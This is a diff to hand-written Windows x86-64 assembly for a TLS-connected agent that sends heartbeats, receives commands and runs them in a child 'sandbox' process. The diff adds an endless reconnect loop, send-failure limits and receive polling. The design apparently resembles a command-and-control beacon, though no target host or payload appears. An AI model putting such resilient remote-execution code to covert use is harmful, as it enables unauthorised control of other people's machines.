@@ -274,6 +274,7 @@ enc_ctr:            resd 1
 frame_payload_len:  resd 1
 recv_pad_chunk:    resd 1
 recv_saved_off:    resd 1
+send_fail_count:   resd 1
 scratch_buf:        resb 256        ; padding discard / misc staging
 
 ; ======================== Schannel TLS Context =============================
@@ -336,14 +337,14 @@ _start:
 
     call create_connection
     cmp rax, INVALID_SOCKET
-    je .ws_fail
+    je .cooldown
 
     mov [sock_fd], rax
 
     ; Perform TLS 1.3 handshake via Schannel
     call tls_connect
     test eax, eax
-    jz .ws_fail
+    jz .cooldown_tls
 
     ; Create sandbox process for plugin execution
     call create_sandbox
@@ -352,7 +353,32 @@ _start:
 
 .no_sandbox:
     call main_loop
-    jmp .exit
+
+    ; session ended: tear down for a clean retry
+    call terminate_sandbox
+.cooldown_tls:
+    call cleanup_tls
+    call cleanup_stream
+.cooldown:
+    mov ecx, 3000                   ; reconnect cooldown
+    call Sleep
+    jmp .no_sandbox_conn
+
+.no_sandbox_conn:
+    ; re-enter connection supervision (label kept distinct for clarity)
+    call create_connection
+    cmp rax, INVALID_SOCKET
+    je .cooldown
+    mov [sock_fd], rax
+    call tls_connect
+    test eax, eax
+    jz .cooldown_tls
+    call create_sandbox
+    test eax, eax
+    jz .no_sandbox
+    call main_loop
+    call terminate_sandbox
+    jmp .cooldown_tls
 
 .ws_fail:
     ; Winsock init/connection failed
@@ -379,13 +405,24 @@ set_nonblocking:
 ; ===========================================================================
 ; Main loop: send encrypted heartbeats and receive commands
 ; ===========================================================================
+SEND_FAIL_LIMIT   equ 3
+
 main_loop:
     sub rsp, 56
+    mov dword [send_fail_count], 0
 
     call set_nonblocking
 
 .loop:
     call send_heartbeat
+    test eax, eax
+    jnz .send_ok
+    inc dword [send_fail_count]
+    cmp dword [send_fail_count], SEND_FAIL_LIMIT
+    jae .fatal
+    jmp .try_recv
+.send_ok:
+    mov dword [send_fail_count], 0
 
     ; Check if sandbox is still alive; respawn if it crashed.
     ; The kernel itself must survive sandbox failures by design.
@@ -412,6 +449,12 @@ main_loop:
     mov ecx, [heartbeat_interval_ms]
     call Sleep
     jmp .loop
+
+.fatal:
+    ; outbound dead (TLS state corrupted): let the supervisor reconnect
+    xor eax, eax
+    add rsp, 56
+    ret
 
 .sandbox_dead:
     call create_sandbox
@@ -586,6 +629,7 @@ tls_recv:                           ; rcx = out, edx = requested -> min(availabl
     push rbx
     push rsi
     push rdi
+    push r12
     sub rsp, 40
     mov rdi, rcx                    ; out
     mov ebx, edx                    ; requested
@@ -593,7 +637,12 @@ tls_recv:                           ; rcx = out, edx = requested -> min(availabl
     sub eax, [tls_decrypted_off]
     test eax, eax
     jg .pr_copy_setup
-    ; staging empty: append new bytes (cap at 32768)
+    ; staging empty: append new bytes (cap at 32768); a nonblocking socket
+    ; can be momentarily empty MID-FRAME — poll briefly instead of failing,
+    ; so a frame spanning TCP segments completes in one recv pass and
+    ; heartbeat ACKs never interleave into a partially-read frame
+    mov r12d, 200                   ; 200 x 10ms = 2s mid-frame grace
+.pr_refill:
     mov eax, [tls_decrypted_len]
     cmp eax, 32768
     jge .pr_none
@@ -603,8 +652,17 @@ tls_recv:                           ; rcx = out, edx = requested -> min(availabl
     sub edx, eax
     call recv_some
     test eax, eax
-    jle .pr_none
+    jg .pr_got
+    dec r12d
+    jz .pr_none
+    push rcx
+    mov ecx, 10
+    call Sleep
+    pop rcx
+    jmp .pr_refill
+.pr_got:
     add [tls_decrypted_len], eax
+    ; fall through to copy
 .pr_copy_setup:
     mov eax, [tls_decrypted_len]
     sub eax, [tls_decrypted_off]
@@ -627,6 +685,7 @@ tls_recv:                           ; rcx = out, edx = requested -> min(availabl
     add [tls_decrypted_off], ebx
     mov eax, ebx
     add rsp, 40
+    pop r12
     pop rdi
     pop rsi
     pop rbx
@@ -634,6 +693,7 @@ tls_recv:                           ; rcx = out, edx = requested -> min(availabl
 .pr_none:
     xor eax, eax
     add rsp, 40
+    pop r12
     pop rdi
     pop rsi
     pop rbx
@@ -2514,7 +2574,7 @@ process_command:
     mov edx, eax
     call sandbox_send
     test eax, eax
-    jz .pc_sandbox_err
+    jz .pc_send_err
 
     ; response length prefix
     lea rcx, [recv_plaintext_buf]
@@ -2541,6 +2601,12 @@ process_command:
     call send_exec_return
     jmp .pc_done
 
+.pc_send_err:
+    mov rcx, .send_err_msg
+    mov edx, .send_err_msg_len
+    call send_exception
+    jmp .pc_done
+
 .pc_sandbox_err:
     mov rcx, .pc_err_msg
     mov edx, .pc_err_msg_len
@@ -2557,8 +2623,10 @@ process_command:
     ret
 
 ; Error message for sandbox failure
-.pc_err_msg: db "sandbox_communication_failed", 0
+.pc_err_msg: db "sandbox_recv_failed", 0
 .pc_err_msg_len equ $ - .pc_err_msg
+.send_err_msg: db "sandbox_send_failed", 0
+.send_err_msg_len equ $ - .send_err_msg
 
 ; ===========================================================================
 ; Data: sandbox configuration
@@ -2899,6 +2967,26 @@ terminate_sandbox:
     mov qword [pipe_stdout_read], 0
 
 .done:
+    add rsp, 40
+    ret
+
+; ===========================================================================
+; cleanup_stream: close the socket and reset per-connection state so the
+; supervisor can start a fresh session
+; ===========================================================================
+cleanup_stream:
+    sub rsp, 40
+    cmp qword [sock_fd], 0
+    je .cs_done
+    mov rcx, [sock_fd]
+    call [ptr_closesocket]
+.cs_done:
+    mov qword [sock_fd], 0
+    mov dword [tls_recv_len], 0
+    mov dword [tls_decrypted_len], 0
+    mov dword [tls_decrypted_off], 0
+    mov dword [tls_context_established], 0
+    mov dword [seq_counter], 0
     add rsp, 40
     ret
 
